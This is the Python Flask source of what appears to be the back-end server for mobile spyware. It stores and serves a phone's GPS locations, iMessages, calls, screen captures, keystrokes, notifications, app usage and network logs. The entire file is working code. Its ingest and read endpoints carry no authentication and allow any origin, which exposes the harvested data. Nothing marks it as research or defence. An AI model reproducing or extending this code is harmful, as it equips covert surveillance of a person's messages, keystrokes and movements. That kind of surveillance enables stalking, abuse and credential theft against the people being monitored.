import json
import sqlite3
import base64
import os
from datetime import datetime
from flask import Flask, request, jsonify
from urllib.parse import unquote_plus
import re

DB_PATH = "/tmp/monitor.db"

app = Flask(__name__)

def get_conn():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    return conn

def init_db():
    conn = get_conn()
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS locations (
            id INTEGER PRIMARY KEY AUTOINCREMENT, latitude REAL NOT NULL, longitude REAL NOT NULL,
            altitude REAL DEFAULT 0, speed REAL DEFAULT 0, accuracy REAL DEFAULT 0,
            timestamp TEXT DEFAULT (datetime('now')));
        CREATE TABLE IF NOT EXISTS messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT, text TEXT, sender TEXT, recipient TEXT,
            is_from_me INTEGER DEFAULT 0, service TEXT DEFAULT 'iMessage', timestamp TEXT);
        CREATE TABLE IF NOT EXISTS calls (
            id INTEGER PRIMARY KEY AUTOINCREMENT, caller_id TEXT, duration INTEGER DEFAULT 0,
            call_type TEXT, timestamp TEXT DEFAULT (datetime('now')));
        CREATE TABLE IF NOT EXISTS screen_captures (
            id INTEGER PRIMARY KEY AUTOINCREMENT, image_b64 TEXT,
            timestamp TEXT DEFAULT (datetime('now')));
        CREATE TABLE IF NOT EXISTS app_usage (
            id INTEGER PRIMARY KEY AUTOINCREMENT, app_name TEXT, bundle_id TEXT,
            duration INTEGER DEFAULT 0, timestamp TEXT DEFAULT (datetime('now')));
        CREATE TABLE IF NOT EXISTS network_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT, method TEXT, host TEXT,
            bytes_sent INTEGER DEFAULT 0, bytes_received INTEGER DEFAULT 0,
            timestamp TEXT DEFAULT (datetime('now')));
        CREATE TABLE IF NOT EXISTS keystrokes (
            id INTEGER PRIMARY KEY AUTOINCREMENT, text TEXT, app_name TEXT,
            timestamp TEXT DEFAULT (datetime('now')));
        CREATE TABLE IF NOT EXISTS notifications (
            id INTEGER PRIMARY KEY AUTOINCREMENT, app_name TEXT, title TEXT, body TEXT,
            timestamp TEXT DEFAULT (datetime('now')));
    """)
    conn.commit()
    conn.close()

init_db()

def q(sql, params=()):
    conn = get_conn()
    rows = [dict(r) for r in conn.execute(sql, params).fetchall()]
    conn.close()
    return rows

def e(sql, params=()):
    conn = get_conn()
    conn.execute(sql, params)
    conn.commit()
    conn.close()

@app.after_request
def add_cors(response):
    response.headers["access-control-allow-origin"] = "*"
    response.headers["access-control-allow-headers"] = "*"
    response.headers["access-control-allow-methods"] = "GET, POST, OPTIONS"
    return response

@app.route("/api/health")
def health():
    return {"status": "ok", "time": datetime.now().isoformat()}

@app.route("/api/summary")
def summary():
    today = datetime.now().strftime("%Y-%m-%d")
    data = {
        "messages_count": q("SELECT COUNT(*) as c FROM messages WHERE date(timestamp)=?", (today,))[0]["c"],
        "calls_count": q("SELECT COUNT(*) as c FROM calls WHERE date(timestamp)=?", (today,))[0]["c"],
        "locations_count": q("SELECT COUNT(*) as c FROM locations WHERE date(timestamp)=?", (today,))[0]["c"],
        "captures_count": q("SELECT COUNT(*) as c FROM screen_captures WHERE date(timestamp)=?", (today,))[0]["c"],
        "apps_used": q("SELECT COUNT(DISTINCT app_name) as c FROM app_usage WHERE date(timestamp)=?", (today,))[0]["c"],
        "keystrokes_count": q("SELECT COUNT(*) as c FROM keystrokes WHERE date(timestamp)=?", (today,))[0]["c"],
        "network_requests": q("SELECT COUNT(*) as c FROM network_log WHERE date(timestamp)=?", (today,))[0]["c"],
    }
    locs = q("SELECT latitude,longitude FROM locations ORDER BY timestamp DESC LIMIT 1")
    data["latest_location"] = locs[0] if locs else None
    return data

@app.route("/api/locations")
def get_locations():
    limit = request.args.get("limit", 100, type=int)
    return q("SELECT * FROM locations ORDER BY timestamp DESC LIMIT ?", (limit,))

@app.route("/api/messages")
def get_messages():
    limit = request.args.get("limit", 200, type=int)
    return q("SELECT * FROM messages ORDER BY timestamp DESC LIMIT ?", (limit,))

@app.route("/api/calls")
def get_calls():
    limit = request.args.get("limit", 100, type=int)
    return q("SELECT * FROM calls ORDER BY timestamp DESC LIMIT ?", (limit,))

@app.route("/api/app_usage")
def get_app_usage():
    limit = request.args.get("limit", 200, type=int)
    return q("SELECT * FROM app_usage ORDER BY timestamp DESC LIMIT ?", (limit,))

@app.route("/api/screen_captures")
def get_screen_captures():
    limit = request.args.get("limit", 20, type=int)
    return q("SELECT id,image_b64,timestamp FROM screen_captures ORDER BY timestamp DESC LIMIT ?", (limit,))

@app.route("/api/network_log")
def get_network_log():
    limit = request.args.get("limit", 200, type=int)
    return q("SELECT * FROM network_log ORDER BY timestamp DESC LIMIT ?", (limit,))

@app.route("/api/keystrokes")
def get_keystrokes():
    limit = request.args.get("limit", 200, type=int)
    return q("SELECT * FROM keystrokes ORDER BY timestamp DESC LIMIT ?", (limit,))

@app.route("/api/notifications")
def get_notifications():
    limit = request.args.get("limit", 200, type=int)
    return q("SELECT * FROM notifications ORDER BY timestamp DESC LIMIT ?", (limit,))

@app.route("/api/ingest/location", methods=["POST"])
def ingest_location():
    e("INSERT INTO locations (latitude,longitude,altitude,speed,accuracy) VALUES (?,?,?,?,?)",
      (float(request.form.get("latitude", 0)), float(request.form.get("longitude", 0)),
       float(request.form.get("altitude", 0)), float(request.form.get("speed", 0)), float(request.form.get("accuracy", 0))))
    return {"ok": True}

@app.route("/api/ingest/message", methods=["POST"])
def ingest_message():
    e("INSERT INTO messages (text,sender,recipient,is_from_me,service,timestamp) VALUES (?,?,?,?,?,?)",
      (request.form.get("text", ""), request.form.get("sender", ""), request.form.get("recipient", ""),
       int(request.form.get("is_from_me", 0)), request.form.get("service", "iMessage"), request.form.get("timestamp", datetime.now().isoformat())))
    return {"ok": True}

@app.route("/api/ingest/call", methods=["POST"])
def ingest_call():
    e("INSERT INTO calls (caller_id,duration,call_type) VALUES (?,?,?)",
      (request.form.get("caller_id", ""), int(request.form.get("duration", 0)), request.form.get("call_type", "missed")))
    return {"ok": True}

@app.route("/api/ingest/screen_capture", methods=["POST"])
def ingest_screen_capture():
    if "file" in request.files:
        f = request.files["file"]
        b64 = base64.b64encode(f.read()).decode()
    else:
        b64 = ""
    e("INSERT INTO screen_captures (image_b64) VALUES (?)", (b64,))
    return {"ok": True}

@app.route("/api/ingest/app_usage", methods=["POST"])
def ingest_app_usage():
    e("INSERT INTO app_usage (app_name,bundle_id,duration) VALUES (?,?,?)",
      (request.form.get("app_name", ""), request.form.get("bundle_id", ""), int(request.form.get("duration", 0))))
    return {"ok": True}

@app.route("/api/ingest/network", methods=["POST"])
def ingest_network():
    e("INSERT INTO network_log (url,method,host,bytes_sent,bytes_received) VALUES (?,?,?,?,?)",
      (request.form.get("url", ""), request.form.get("method", "GET"), request.form.get("host", ""),
       int(request.form.get("bytes_sent", 0)), int(request.form.get("bytes_received", 0))))
    return {"ok": True}

@app.route("/api/ingest/keystroke", methods=["POST"])
def ingest_keystroke():
    e("INSERT INTO keystrokes (text,app_name) VALUES (?,?)",
      (request.form.get("text", ""), request.form.get("app_name", "")))
    return {"ok": True}

@app.route("/api/ingest/notification", methods=["POST"])
def ingest_notification():
    e("INSERT INTO notifications (app_name,title,body) VALUES (?,?,?)",
      (request.form.get("app_name", ""), request.form.get("title", ""), request.form.get("body", "")))
    return {"ok": True}

handler = app
